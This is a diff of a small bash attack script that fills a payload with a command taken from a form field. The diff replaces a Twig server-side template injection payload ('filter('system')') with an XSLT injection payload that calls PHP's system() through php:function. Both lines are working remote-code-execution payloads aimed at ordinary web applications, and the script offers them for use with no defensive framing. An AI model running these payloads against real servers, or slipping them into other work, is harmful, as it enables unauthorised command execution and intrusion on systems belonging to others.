@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-SSTI - twig rce, execute code
+XSLT - rce
 '
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
@@ -12,4 +12,4 @@ generate_form "${CMD_FIELD}"
 
 CMD=${form_data["file"]}
 
-execute_command "{{ ['${CMD}'] | filter('system') }}"
+execute_command "<xsl:value-of select=\"php:function('system','${CMD}')\" />"
